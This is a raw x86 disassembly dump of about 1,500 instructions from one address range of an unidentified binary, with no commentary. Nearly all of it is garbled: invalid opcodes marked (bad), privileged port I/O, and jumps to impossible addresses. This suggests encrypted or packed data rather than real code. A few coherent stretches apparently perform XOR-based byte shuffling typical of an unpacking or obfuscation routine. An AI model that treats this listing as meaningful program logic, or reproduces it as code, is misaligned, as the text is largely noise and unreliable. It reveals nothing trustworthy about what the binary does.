  408c31:	mov    ds:0x7f7bbcf4,eax
  408c36:	xor    ebx,DWORD PTR [ebx+0x69c58560]
  408c3c:	cmp    eax,DWORD PTR [ebx-0x1d30f65f]
  408c42:	adc    al,0x7a
  408c44:	lds    ecx,FWORD PTR [esi]
  408c46:	into   
  408c47:	inc    edi
  408c48:	and    eax,0x7160232b
  408c4d:	lods   eax,DWORD PTR ds:[esi]
  408c4e:	aam    0x90
  408c50:	push   esi
  408c51:	pop    ebx
  408c52:	fsubr  DWORD PTR [eax+0x47034d67]
  408c58:	fdiv   st,st(3)
  408c5a:	xor    BYTE PTR [ecx+0x4f],cl
  408c5d:	xchg   esi,eax
  408c5e:	cmp    ebx,ecx
  408c60:	cdq    
  408c61:	jg     0xa0d6f201
  408c67:	push   edi
  408c68:	js     0x408c2b
  408c6a:	xor    BYTE PTR [esi+0x678b8f49],ah
  408c70:	out    0x2,al
  408c72:	sbb    bl,BYTE PTR [edx+eiz*4]
  408c75:	es int3 
  408c77:	retf   
  408c78:	dec    ebp
  408c79:	xchg   ebx,eax
  408c7a:	inc    ecx
  408c7b:	sti    
  408c7c:	xchg   edx,eax
  408c7d:	sub    DWORD PTR [ebx-0xbcfea6c],edx
  408c83:	cmc    
  408c84:	arpl   WORD PTR [edx+0x12],di
  408c87:	or     eax,0xbe1da5e6
  408c8c:	mov    BYTE PTR [edx-0x538f184b],ch
  408c92:	adc    dh,0x5d
  408c95:	mov    esp,ss
  408c97:	fbstp  TBYTE PTR [esi-0x4fb96970]
  408c9d:	pop    edx
  408c9e:	dec    eax
  408c9f:	pop    ecx
  408ca0:	sbb    BYTE PTR [esi+ebp*2+0x4e045032],ah
  408ca7:	icebp  
  408ca8:	adc    ebp,DWORD PTR [eax]
  408caa:	cs (bad) 
  408cac:	out    dx,al
  408cad:	test   BYTE PTR [esi+0xd1614b],bl
  408cb3:	pop    ds
  408cb4:	rcr    BYTE PTR [esi+esi*8+0x1e22518f],0x18
  408cbc:	sbb    bl,BYTE PTR [esi-0x57]
  408cbf:	push   0x7fe62763
  408cc4:	shr    DWORD PTR [edi-0x619ab3f9],1
  408cca:	adc    BYTE PTR [ebp+0x16214b3b],bl
  408cd0:	jne    0x408c6c
  408cd2:	aam    0xac
  408cd4:	push   edx
  408cd5:	popf   
  408cd6:	push   cs
  408cd7:	call   0xf78f351b
  408cdc:	xchg   esi,eax
  408cdd:	call   0x526a:0xb70c2d15
  408ce4:	mov    cl,0x68
  408ce6:	inc    edx
  408ce7:	mov    WORD PTR [ecx+0x404da42e],cs
  408ced:	xor    bh,BYTE PTR [ebx-0x67]
  408cf0:	push   ss
  408cf1:	mov    cl,0xfb
  408cf3:	or     al,0xca
  408cf5:	cdq    
  408cf6:	in     al,dx
  408cf7:	dec    edi
  408cf8:	lods   al,BYTE PTR ds:[esi]
  408cf9:	stos   BYTE PTR es:[edi],al
  408cfa:	ins    BYTE PTR es:[edi],dx
  408cfb:	mov    ds:0x1c7c8915,al
  408d00:	jl     0x408d32
  408d02:	imul   edi,DWORD PTR [edx-0x5f41ada8],0xd724d648
  408d0c:	mov    esp,0x50371e01
  408d11:	mov    DWORD PTR [edx+0x2d8cb47c],ecx
  408d17:	in     eax,dx
  408d18:	xor    ch,BYTE PTR [edx+ebx*8+0x4b]
  408d1c:	test   eax,0x71cab2cb
  408d21:	fadd   st(4),st
  408d23:	mov    BYTE PTR [edi-0x17],al
  408d26:	jp     0x408d28
  408d28:	sub    BYTE PTR [ecx+ebx*8+0x7e54a454],ch
  408d2f:	rol    cl,0xf7
  408d32:	jo     0x408d54
  408d34:	inc    ax
  408d36:	daa    
  408d37:	push   edi
  408d38:	call   esp
  408d3a:	cs mov dh,0x4a
  408d3d:	adc    DWORD PTR [ebp-0x27f38870],ecx
  408d43:	xlat   BYTE PTR ds:[ebx]
  408d44:	fnstcw WORD PTR [ebp-0x45]
  408d47:	mov    WORD PTR [esi],fs
  408d49:	dec    ebp
  408d4a:	arpl   WORD PTR [esp+eax*8+0x62ff7dd6],bx
  408d51:	sbb    DWORD PTR [edi+ebp*8-0x5f8bce27],ebp
  408d58:	adc    edi,DWORD PTR [edi-0x59]
  408d5b:	adc    eax,esi
  408d5d:	int    0x3e
  408d5f:	in     al,dx
  408d60:	call   0xbad1:0x776eb111
  408d67:	aas    
  408d68:	pop    edx
  408d69:	and    eax,0x6abb3357
  408d6e:	jbe    0x408d78
  408d70:	sub    edi,esp
  408d72:	sub    al,0x72
  408d74:	retf   0xe71a
  408d77:	es addr16 pusha 
  408d7a:	cld    
  408d7b:	lahf   
  408d7c:	ror    DWORD PTR [edi+0x19],1
  408d7f:	repz mov ebx,0xd429de9d
  408d85:	jns    0x408d31
  408d87:	cli    
  408d88:	or     eax,0x6c3f1e61
  408d8d:	test   DWORD PTR [ecx+0x15],esi
  408d90:	jne    0x408d15
  408d92:	fldcw  WORD PTR [edx+0x33f4558b]
  408d98:	rol    BYTE PTR [ebx],1
  408d9a:	push   ebp
  408d9b:	in     al,dx
  408d9c:	mov    edi,DWORD PTR [ebp-0x1c]
  408d9f:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  408da6:	mov    BYTE PTR [ebp+0xb],dl
  408da9:	jmp    0x408fbd
  408dae:	bound  ebp,QWORD PTR [ebx-0xa]
  408db1:	popf   
  408db2:	cmc    
  408db3:	mov    eax,ds:0xc8827371
  408db8:	cdq    
  408db9:	ins    BYTE PTR es:[edi],dx
  408dba:	push   0x6b
  408dbc:	cwde   
  408dbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408dbe:	xchg   ebx,eax
  408dbf:	fidiv  WORD PTR [eax+0x70]
  408dc2:	imul   edi,DWORD PTR [edi+0x70],0x3904a670
  408dc9:	fadd   st(7),st
  408dcb:	inc    ebx
  408dcc:	or     BYTE PTR [ecx+0x45],dh
  408dcf:	in     eax,0xcc
  408dd1:	mov    ds:0x5d67fe48,al
  408dd6:	(bad)  
  408dd7:	xor    dh,BYTE PTR [ebp-0x394b27c]
  408ddd:	mov    ecx,0xb2d562d6
  408de2:	nop
  408de3:	mov    bh,BYTE PTR [ecx-0x1d]
  408de6:	mov    bl,0xdf
  408de8:	iret   
  408de9:	dec    ecx
  408dea:	xchg   ecx,eax
  408deb:	sub    dl,BYTE PTR [esi]
  408ded:	sbb    edx,edi
  408def:	retf   
  408df0:	ins    BYTE PTR es:[edi],dx
  408df1:	sub    al,0x5f
  408df4:	fmul   st(0),st
  408df6:	mov    DWORD PTR [esi],ebx
  408df8:	and    ebp,DWORD PTR [edi+0x16]
  408dfb:	add    ch,BYTE PTR [edi]
  408dfd:	push   edx
  408dfe:	out    dx,eax
  408dff:	add    DWORD PTR [edi],eax
  408e01:	push   0xfffffffc
  408e03:	repnz inc esp
  408e05:	dec    edx
  408e06:	(bad)  [edi]
  408e08:	idiv   DWORD PTR [ebx+0x31]
  408e0b:	test   eax,0xf848ff23
  408e10:	sbb    eax,0x7ef84130
  408e15:	cs or  eax,0x17981016
  408e1b:	add    dl,ah
  408e1d:	jnp    0x408e9a
  408e1f:	mov    ecx,DWORD PTR [eax-0x61daf01e]
  408e25:	pop    ss
  408e26:	jl     0x408deb
  408e28:	sub    bl,al
  408e2a:	or     eax,DWORD PTR [ecx]
  408e2c:	repz rcr BYTE PTR [eax+eax*2],cl
  408e30:	mov    ds:0xe6666954,eax
  408e35:	(bad)  
  408e36:	adc    eax,0xbf2621c5
  408e3b:	mov    eax,0xb6c842d3
  408e40:	enter  0xcd93,0x8f
  408e44:	ds mov dl,0x83
  408e47:	and    DWORD PTR [edi-0x72],esi
  408e4a:	inc    edi
  408e4b:	cmp    ebx,0x43
  408e4e:	xor    ebx,DWORD PTR [ecx]
  408e50:	(bad)  
  408e51:	xlat   BYTE PTR ds:[ebx]
  408e52:	push   edx
  408e53:	jg     0x408dff
  408e55:	and    eax,0xbbb947f7
  408e5a:	call   0x9af2fbd9
  408e5f:	pop    edx
  408e60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e61:	(bad)  
  408e62:	mov    DWORD PTR [ebx-0x33026530],ebx
  408e68:	sub    bh,dh
  408e6a:	rcr    ah,1
  408e6c:	(bad)  
  408e6d:	call   0x28e883fa
  408e72:	bound  ebx,QWORD PTR [edx]
  408e74:	add    BYTE PTR [edi],0x20
  408e77:	cdq    
  408e78:	call   0xeab14fc1
  408e7d:	ds xchg esp,eax
  408e7f:	and    ebp,DWORD PTR [edx-0x31]
  408e82:	out    dx,al
  408e83:	test   BYTE PTR [edi+esi*8+0x100a51e8],al
  408e8a:	xchg   ebx,eax
  408e8b:	(bad)  
  408e8c:	or     edx,edx
  408e8e:	cmp    DWORD PTR [edi-0x31],edi
  408e91:	ds dec edi
  408e93:	retf   
  408e94:	scas   eax,DWORD PTR es:[edi]
  408e95:	sti    
  408e96:	mov    cl,0x2a
  408e98:	mov    BYTE PTR [edi+ecx*8],ah
  408e9b:	cmp    al,0x66
  408e9d:	mov    DWORD PTR [edx+0x2dc10058],eax
  408ea3:	adc    DWORD PTR [edi-0x44],eax
  408ea6:	jge    0x408ed8
  408ea8:	xor    eax,0xe8a5bd52
  408ead:	leave  
  408eae:	add    DWORD PTR [edx-0x6e],esi
  408eb1:	lods   eax,DWORD PTR ds:[esi]
  408eb2:	into   
  408eb3:	or     eax,0x99066362
  408eb8:	not    DWORD PTR [edi]
  408eba:	dec    ecx
  408ebb:	out    dx,eax
  408ebc:	es stos DWORD PTR es:[edi],eax
  408ebe:	push   esp
  408ebf:	add    al,0x81
  408ec1:	jbe    0x408e95
  408ec3:	mov    WORD PTR [eax-0x26],ds
  408ec6:	mov    edi,0x492a447f
  408ecb:	cld    
  408ecc:	sub    DWORD PTR [eax],esi
  408ece:	aad    0x4f
  408ed0:	xchg   ebp,eax
  408ed1:	lds    ecx,FWORD PTR [edx+0x17]
  408ed4:	pop    eax
  408ed5:	xor    ecx,DWORD PTR [ebp+0x2b]
  408ed8:	mov    ebp,0x23d4ee0e
  408edd:	mov    eax,DWORD PTR [esi-0x4bc07644]
  408ee3:	adc    bh,dl
  408ee5:	je     0x408e70
  408ee7:	mov    DWORD PTR [ebp-0x2e],ecx
  408eea:	fs (bad) 
  408eec:	jmp    0x67dfcc2b
  408ef1:	loop   0x408f69
  408ef3:	inc    ecx
  408ef4:	sahf   
  408ef5:	(bad)  
  408ef6:	jmp    0x408f63
  408ef8:	jnp    0x408f39
  408efa:	pop    ebx
  408efb:	xor    esp,DWORD PTR [eax]
  408efd:	sub    bl,BYTE PTR [edx+0x6fc7f4cb]
  408f03:	xchg   ecx,eax
  408f04:	pop    esp
  408f05:	stc    
  408f06:	lock inc esi
  408f08:	mov    cl,0x5
  408f0a:	mov    edx,0xc717e196
  408f0f:	test   al,0xe
  408f11:	mov    al,BYTE PTR [ecx]
  408f13:	pusha  
  408f14:	adc    ebx,DWORD PTR [eax+0x5c]
  408f17:	jae    0x408ea2
  408f19:	mov    ecx,0x722361e5
  408f1e:	add    ch,BYTE PTR [esi]
  408f20:	mov    al,0xc2
  408f22:	jnp    0x408efc
  408f24:	add    DWORD PTR [esi],edi
  408f26:	inc    edi
  408f27:	repz pushf 
  408f29:	xor    esp,esp
  408f2b:	mov    ds:0xc7f7e6fc,eax
  408f30:	xlat   BYTE PTR ds:[ebx]
  408f31:	xchg   DWORD PTR [eax],ebp
  408f33:	jl     0x408f9b
  408f35:	hlt    
  408f36:	shr    BYTE PTR ds:0xe80f83c3,cl
  408f3c:	cmp    DWORD PTR [ebx-0x358a264],ebp
  408f42:	(bad)  
  408f44:	hlt    
  408f45:	outs   dx,BYTE PTR ds:[esi]
  408f46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f47:	outs   dx,BYTE PTR ds:[esi]
  408f48:	dec    esi
  408f49:	inc    edx
  408f4b:	mov    ebx,0xd5d41e70
  408f50:	push   0x6b
  408f52:	imul   edx,ecx,0x5cc0575a
  408f58:	fcmove st,st(3)
  408f5a:	mov    edi,0xf6f14d5a
  408f5f:	dec    esi
  408f60:	fs xchg edi,eax
  408f62:	sub    BYTE PTR [edx+0x3350aa99],al
  408f68:	mov    ecx,0xc9167fb5
  408f6d:	add    bl,0x4a
  408f70:	pop    edx
  408f71:	shl    BYTE PTR [edi+0x3b515072],cl
  408f77:	fdivp  st(1),st
  408f79:	(bad)  
  408f7a:	not    BYTE PTR [eax]
  408f7c:	shr    DWORD PTR [ebx-0x4b],0x9
  408f80:	jb     0x408f43
  408f82:	out    dx,eax
  408f83:	sahf   
  408f84:	(bad)  
  408f85:	ds pop esp
  408f87:	xor    al,0xcb
  408f89:	dec    ecx
  408f8a:	inc    ecx
  408f8b:	inc    ebp
  408f8c:	mov    WORD PTR [edi-0x323856f7],sp
  408f93:	les    ebp,FWORD PTR [eax+0x12]
  408f96:	int3   
  408f97:	push   0xe8d5518e
  408f9c:	outs   dx,BYTE PTR ds:[esi]
  408f9d:	and    BYTE PTR [edi+0x4e],dl
  408fa0:	in     al,dx
  408fa1:	xor    eax,0x7661d2cd
  408fa6:	imul   BYTE PTR [edx-0x1435c9af]
  408fac:	leave  
  408fad:	imul   edi,eax,0x4b
  408fb0:	ds pop esp
  408fb2:	cmp    ebx,ebx
  408fb4:	xadd   DWORD PTR [eax+edi*2-0x9],ecx
  408fb9:	adc    ebx,ebp
  408fbb:	and    BYTE PTR [esi],dh
  408fbd:	mov    dl,BYTE PTR [ebp+0xf]
  408fc0:	mov    edi,DWORD PTR [ebp-0xc]
  408fc3:	xor    edi,eax
  408fc5:	add    edi,DWORD PTR [ebp-0x14]
  408fc8:	mov    ebx,DWORD PTR [ebp-0x1c]
  408fcb:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  408fd2:	mov    dl,BYTE PTR [ebp+0xb]
  408fd5:	mov    edi,DWORD PTR [ebp-0x18]
  408fd8:	xor    edi,eax
  408fda:	add    edi,DWORD PTR [ebp-0x14]
  408fdd:	mov    ebx,DWORD PTR [ebp-0x1c]
  408fe0:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  408fe7:	mov    edx,DWORD PTR [ebp-0x44]
  408fea:	mov    edi,DWORD PTR [ebp-0xc]
  408fed:	xor    edx,eax
  408fef:	xor    edi,eax
  408ff1:	add    edx,ecx
  408ff3:	jmp    0x409207
  408ff8:	or     ah,bh
  408ffa:	das    
  408ffb:	mov    ?,ecx
  408ffd:	push   esi
  408ffe:	test   eax,0xbb5c4a63
  409003:	into   
  409004:	test   eax,0x8ce1212b
  409009:	fdiv   QWORD PTR [eax+0x70]
  40900c:	imul   edi,DWORD PTR [edi+0x70],0xa7c6aa70
  409013:	fdivr  DWORD PTR [ecx+0x4d]
  409016:	jp     0x409006
  409018:	rol    al,0x73
  40901b:	sub    DWORD PTR [ebp+0x1f781792],edi
  409021:	pop    ebx
  409022:	mov    bl,0x22
  409024:	mov    eax,ds:0x32fbc99c
  409029:	rcl    BYTE PTR [eax+0x9],0x44
  40902d:	sub    eax,0xb94dfe3d
  409032:	out    dx,eax
  409033:	push   ds
  409034:	imul   edx,DWORD PTR [ebx+0x23],0xf6201049
  40903b:	push   esp
  40903c:	test   al,0xb4
  40903e:	inc    esi
  40903f:	ins    DWORD PTR es:[edi],dx
  409040:	mov    al,0xf9
  409042:	push   edi
  409043:	xchg   esi,eax
  409044:	jmp    0x4090ad
  409046:	xor    ebx,edi
  409048:	mov    ?,edi
  40904a:	dec    edx
  40904b:	and    al,BYTE PTR [edi+edi*1]
  40904e:	rol    BYTE PTR [edi+0x1e],cl
  409051:	sbb    ah,al
  409053:	dec    ebp
  409054:	fwait
  409055:	int    0x61
  409057:	daa    
  409058:	scas   al,BYTE PTR es:[edi]
  409059:	jl     0x40908a
  40905b:	dec    ebp
  40905c:	stc    
  40905d:	arpl   di,ax
  40905f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409060:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409061:	shl    esi,1
  409063:	xchg   edx,eax
  409064:	sar    DWORD PTR [ebp+0x6061bff6],cl
  40906a:	push   ebx
  40906b:	mov    ch,0x62
  40906d:	(bad)  
  40906e:	or     DWORD PTR [esi+0x5af468db],esi
  409074:	cmp    al,0xa9
  409076:	scas   eax,DWORD PTR es:[edi]
  409077:	pop    ecx
  409078:	retf   
  409079:	push   0x527a004a
  40907e:	fsubr  QWORD PTR [edi-0x5fbce796]
  409084:	xor    BYTE PTR [ecx+0x4e8bdf21],ah
  40908a:	hlt    
  40908b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40908c:	aam    0xeb
  40908e:	jecxz  0x409026
  409090:	inc    edx
  409091:	pop    es
  409092:	push   0xa4669a0b
  409097:	and    eax,0x786bf57
  40909c:	sub    al,0xc2
  40909e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40909f:	in     al,0xcb
  4090a1:	push   ds
  4090a2:	mov    BYTE PTR [esi-0x4],bl
  4090a5:	or     edi,eax
  4090a7:	jmp    0xfca4b406
  4090ac:	jmp    0x74ee4d11
  4090b1:	push   esi
  4090b2:	in     al,0x37
  4090b4:	jo     0x4090b3
  4090b6:	lea    edx,[edi+0x1b]
  4090b9:	and    ch,BYTE PTR [eax]
  4090bb:	push   0xad232791
  4090c0:	cld    
  4090c1:	sbb    dl,0x3c
  4090c4:	dec    esi
  4090c5:	aaa    
  4090c6:	adc    cl,BYTE PTR [ebx-0x13]
  4090c9:	nop
  4090ca:	dec    ecx
  4090cb:	test   DWORD PTR [eax],ebp
  4090cd:	addr16 inc edi
  4090cf:	mov    bl,al
  4090d1:	cmp    esp,DWORD PTR [edi]
  4090d3:	sub    eax,0xa2ebc5f0
  4090d8:	ror    BYTE PTR [ebp+0x6e562810],cl
  4090de:	push   edx
  4090df:	mov    ecx,ebx
  4090e1:	push   edx
  4090e2:	cmp    eax,0xe57e0709
  4090e7:	ins    BYTE PTR es:[edi],dx
  4090e8:	int    0xb3
  4090ea:	scas   eax,DWORD PTR es:[edi]
  4090eb:	cmp    al,0x15
  4090ed:	ds dec edi
  4090ef:	sbb    al,0x59
  4090f1:	push   esi
  4090f2:	pop    edx
  4090f3:	(bad)  
  4090f4:	idiv   DWORD PTR [esi]
  4090f6:	sub    al,0x79
  4090f8:	pop    edx
  4090f9:	call   0x8513:0xc9b5cb15
  409100:	jg     0x409175
  409102:	sar    BYTE PTR [eax+0x6b],1
  409105:	ss dec edi
  409107:	cmc    
  409108:	scas   eax,DWORD PTR es:[edi]
  409109:	inc    eax
  40910a:	sub    al,0x3d
  40910c:	mov    al,0x6a
  40910e:	push   ecx
  40910f:	or     dl,BYTE PTR [esi+eiz*2+0x5cdc1183]
  409116:	jns    0x40917e
  409118:	repz std 
  40911a:	jb     0x40915b
  40911c:	jmp    0x669f8a21
  409121:	mov    ebx,0x15980086
  409126:	iret   
  409127:	retf   0xfe80
  40912a:	daa    
  40912b:	or     dl,dh
  40912d:	leave  
  40912e:	mov    dl,0x29
  409130:	add    al,0xf2
  409132:	xchg   edi,eax
  409133:	sahf   
  409134:	bound  ebx,QWORD PTR [edx-0xb]
  409137:	xchg   ebp,eax
  409138:	das    
  409139:	pop    edi
  40913a:	ins    BYTE PTR es:[edi],dx
  40913b:	test   DWORD PTR [esi-0x37],0x15667642
  409142:	jb     0x4090ff
  409144:	mov    al,0xef
  409146:	sbb    bl,BYTE PTR [eax+0x63c972a5]
  40914c:	shl    al,0x15
  40914f:	dec    ebx
  409150:	ret    
  409151:	cmp    esp,DWORD PTR [esi-0x4]
  409154:	hlt    
  409155:	jne    0x40913b
  409157:	jecxz  0x409154
  409159:	and    ebx,DWORD PTR [esi]
  40915b:	aaa    
  40915c:	inc    ebx
  40915d:	lds    ecx,FWORD PTR [ecx+esi*1+0x5f49e6c]
  409164:	mov    eax,0xe4ddb0c2
  409169:	div    BYTE PTR [esi+0x577bf49d]
  40916f:	mov    ds:0x6d3c7419,al
  409174:	(bad)  
  409175:	(bad)  
  409177:	adc    esp,DWORD PTR [esi-0x12]
  40917a:	cdq    
  40917b:	adc    esp,DWORD PTR [edx-0x63e13228]
  409181:	or     ebp,DWORD PTR [esi]
  409183:	pop    esi
  409184:	pusha  
  409185:	test   BYTE PTR [edi+0x460b41d0],0x4
  40918c:	sub    DWORD PTR [ecx+0x31],edi
  40918f:	pop    ebp
  409190:	adc    al,0x9a
  409192:	call   0x51db830c
  409197:	push   0xe5cecaf5
  40919c:	xchg   esp,eax
  40919d:	pop    edx
  40919e:	push   ebp
  40919f:	xchg   ecx,eax
  4091a0:	cmp    DWORD PTR [edi],0x61
  4091a3:	push   ds
  4091a4:	in     eax,dx
  4091a5:	mov    al,ds:0x9bfb6aa3
  4091aa:	and    DWORD PTR [eax*8-0x6d3e29ef],0x74839090
  4091b5:	sbb    al,0xe8
  4091b7:	lahf   
  4091b8:	mov    esp,ds
  4091ba:	mov    WORD PTR [esi+0x3fcb4a43],gs
  4091c0:	xlat   BYTE PTR ds:[ebx]
  4091c1:	xchg   ebp,eax
  4091c2:	mov    eax,ds:0xe62f5235
  4091c7:	jp     0x40919a
  4091c9:	stc    
  4091ca:	add    eax,0xe1220f64
  4091cf:	test   al,0x70
  4091d1:	out    0x91,al
  4091d3:	repz scas al,BYTE PTR es:[edi]
  4091d5:	sti    
  4091d6:	jns    0x409198
  4091d8:	mov    esi,0x9837cf16
  4091dd:	lods   al,BYTE PTR ds:[esi]
  4091de:	int    0x47
  4091e0:	cmp    ch,BYTE PTR [eax+0x35]
  4091e3:	(bad)  
  4091e4:	cdq    
  4091e5:	pusha  
  4091e6:	pop    edi
  4091e7:	aad    0x65
  4091e9:	mov    ebx,0x8ae9fc29
  4091ef:	push   esp
  4091f0:	cmp    bh,BYTE PTR [edx+0x24c05850]
  4091f6:	addr16 pop esi
  4091f8:	sar    DWORD PTR [esi-0x44184d18],cl
  4091fe:	scas   eax,DWORD PTR es:[edi]
  4091ff:	inc    DWORD PTR [ecx]
  409201:	rcl    BYTE PTR [esi],cl
  409203:	and    al,0x4e
  409205:	jns    0x4091d4
  409207:	add    edi,ecx
  409209:	jmp    0x40941d
  40920e:	sbb    BYTE PTR [edx-0x68cdf8d6],0xb1
  409215:	cdq    
  409216:	js     0x4091b8
  409218:	mov    ah,0x66
  40921a:	(bad)  
  40921b:	dec    edi
  40921c:	mov    fs,WORD PTR ds:0x7070da85
  409222:	imul   edi,DWORD PTR [edi+0x70],0x21b19270
  409229:	leave  
  40922a:	jle    0x409232
  40922c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40922d:	xchg   ebp,eax
  40922e:	mov    edx,0x7b85c852
  409233:	jl     0x40921b
  409235:	xor    edx,DWORD PTR [eax-0x25]
  409238:	or     DWORD PTR [edi-0x2b3565ee],0x6addd7d7
  409242:	jg     0x40920d
  409244:	pop    esi
  409245:	test   al,0xc0
  409247:	(bad)  
  409248:	mov    ds:0x233bd4fb,al
  40924d:	push   ecx
  40924e:	dec    ecx
  40924f:	dec    ecx
  409250:	xchg   edi,eax
  409251:	rcl    BYTE PTR [esi],1
  409253:	mov    ch,0xdf
  409255:	repnz inc eax
  409257:	dec    eax
  409258:	sahf   
  409259:	arpl   cx,bp
  40925b:	scas   eax,DWORD PTR es:[edi]
  40925c:	mul    esi
  40925e:	(bad)  
  409260:	iret   
  409261:	and    dh,al
  409263:	fwait
  409264:	(bad)  
  409265:	repnz shr BYTE PTR ds:0x193d30f6,1
  40926c:	xlat   BYTE PTR ds:[ebx]
  40926d:	xchg   BYTE PTR [ebp+0x7f],cl
  409270:	jge    0x409225
  409272:	xchg   ecx,eax
  409273:	(bad)  
  409274:	fiadd  WORD PTR [esi+esi*2]
  409277:	aas    
  409278:	fldenv [edi+esi*1+0x46]
  40927c:	mov    eax,ds:0xee4af1bf
  409281:	gs (bad) 
  409284:	and    eax,0x787600c2
  409289:	jmp    0x409232
  40928b:	call   0x4dd526c0
  409290:	or     BYTE PTR [ebx+ebp*4+0x1e],dh
  409294:	fucompp 
  409296:	test   eax,0xe9ed1e7b
  40929b:	jbe    0x40929b
  40929d:	pop    es
  40929e:	pushf  
  40929f:	pop    ds
  4092a0:	add    al,0x80
  4092a2:	test   al,0xab
  4092a4:	jnp    0x4092da
  4092a6:	sahf   
  4092a7:	fistp  QWORD PTR [edx-0xf]
  4092aa:	dec    edx
  4092ab:	(bad)  
  4092ac:	pop    ecx
  4092ad:	push   ecx
  4092ae:	sbb    edx,DWORD PTR [esi]
  4092b0:	adc    eax,0x40c8732e
  4092b5:	popa   
  4092b6:	sbb    eax,0x4673df84
  4092bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4092bc:	adc    ah,al
  4092be:	push   edi
  4092bf:	aam    0x25
  4092c1:	jo     0x4092d3
  4092c3:	mov    ch,0xbb
  4092c5:	popa   
  4092c6:	loope  0x409295
  4092c8:	dec    esi
  4092c9:	pop    ecx
  4092ca:	mov    ah,0xb6
  4092cc:	scas   eax,DWORD PTR es:[edi]
  4092cd:	clc    
  4092ce:	xchg   edx,eax
  4092cf:	mov    cl,0xfb
  4092d1:	test   BYTE PTR [ebp+0x5a],cl
  4092d4:	sbb    BYTE PTR [ecx-0x7886773b],cl
  4092da:	xor    esp,DWORD PTR [ecx-0x3b9b62e9]
  4092e0:	mov    esi,0x460d15c0
  4092e5:	fninit 
  4092e7:	jne    0x40930b
  4092e9:	sbb    al,dl
  4092eb:	loope  0x409310
  4092ed:	mov    gs,WORD PTR [ebx]
  4092ef:	fs pop ss
  4092f1:	fwait
  4092f2:	and    DWORD PTR [ebx-0x6d],ebx
  4092f5:	(bad)  
  4092f7:	inc    BYTE PTR ds:0xd9240d53
  4092fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4092fe:	add    BYTE PTR [eax-0x2f],dl
  409301:	sbb    DWORD PTR [ebp+eax*1+0x440338ff],ebx
  409308:	inc    esi
  409309:	pushf  
  40930a:	aaa    
  40930b:	aas    
  40930c:	push   0x69
  40930e:	sub    al,0xc5
  409310:	in     eax,dx
  409311:	int3   
  409312:	xor    bl,dh
  409314:	jmp    0x409303
  409316:	mov    cl,0x40
  409318:	fwait
  409319:	nop
  40931a:	int3   
  40931b:	stos   BYTE PTR es:[edi],al
  40931c:	jae    0x4092b8
  40931e:	retf   0xa1cf
  409321:	add    eax,0xa72deccf
  409326:	push   edx
  409327:	and    edx,DWORD PTR [edx+edi*8+0x1481145a]
  40932e:	jb     0x40931a
  409330:	hlt    
  409331:	imul   BYTE PTR [ebp-0x28baa761]
  409337:	ss jmp 0x801fbc4f
  40933d:	daa    
  40933e:	sbb    al,0xdb
  409340:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409341:	(bad)  
  409342:	jmp    0xa433d880
  409347:	adc    DWORD PTR [ebx+0x57],esp
  40934a:	inc    edi
  40934b:	test   BYTE PTR [edx+0x4f4ebd9f],dl
  409351:	mov    DWORD PTR [eax-0x26],eax
  409354:	iret   
  409355:	imul   ecx,ebx,0x4
  409358:	pop    edx
  409359:	in     eax,0x84
  40935b:	jle    0x40935d
  40935d:	or     DWORD PTR [eax+0x6e9c74a8],ebx
  409363:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409364:	fcomp  DWORD PTR [esi-0x50]
  409367:	pop    edi
  409368:	fs test eax,0x53a941e0
  40936e:	jecxz  0x409333
  409370:	adc    al,0xb9
  409372:	enter  0x8efd,0x2b
  409376:	add    al,0x6f
  409378:	stos   DWORD PTR es:[edi],eax
  409379:	test   al,0x2a
  40937b:	mov    esp,0x8f92939c
  409380:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409381:	cld    
  409382:	scas   al,BYTE PTR es:[edi]
  409383:	and    DWORD PTR [esi],ebp
  409385:	shl    BYTE PTR [edi-0x40970c78],cl
  40938b:	test   BYTE PTR [ecx+0x77ccb861],bh
  409391:	sub    al,0x79
  409393:	aad    0xea
  409395:	(bad)  
  409396:	shl    BYTE PTR [edx+ebx*2-0x47798d99],0x5e
  40939e:	not    DWORD PTR [edi-0x27]
  4093a1:	or     dh,BYTE PTR [ebp+0x4755d315]
  4093a7:	mov    dl,0x83
  4093a9:	mov    BYTE PTR ds:0xf92e5ce6,bh
  4093af:	in     eax,0x87
  4093b1:	hlt    
  4093b2:	addr16 ret 
  4093b4:	stos   DWORD PTR es:[edi],eax
  4093b5:	shr    DWORD PTR [edi+0x1c],1
  4093b8:	js     0x4093f2
  4093ba:	stc    
  4093bb:	in     eax,0x12
  4093bd:	jns    0x409350
  4093bf:	mov    eax,ds:0x3e6b9ec0
  4093c4:	xor    al,0x18
  4093c6:	test   BYTE PTR [ecx],dh
  4093c8:	in     al,0x6e
  4093ca:	sub    BYTE PTR [esi+0x62b2225d],bl
  4093d0:	xchg   ecx,eax
  4093d1:	xor    ecx,DWORD PTR [ecx+0x7a5148c8]
  4093d7:	(bad)  
  4093d8:	lock push esi
  4093da:	sbb    al,0x9
  4093dc:	and    eax,DWORD PTR [eax-0x60db0beb]
  4093e2:	fstp   DWORD PTR ds:0x5ef22887
  4093e8:	das    
  4093e9:	mov    dl,BYTE PTR [ecx+0x1b7770c8]
  4093ef:	(bad)  
  4093f0:	repz or edi,DWORD PTR [ebx]
  4093f3:	cmp    dl,BYTE PTR [edx]
  4093f5:	and    esp,edx
  4093f7:	xchg   ebx,eax
  4093f8:	ds (bad) 
  4093fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4093fb:	mov    ebx,0xfe97ffac
  409400:	mov    ebp,0x693ea551
  409405:	and    al,0x5d
  409407:	sbb    DWORD PTR [ebp+0x7],ebx
  40940a:	(bad)  
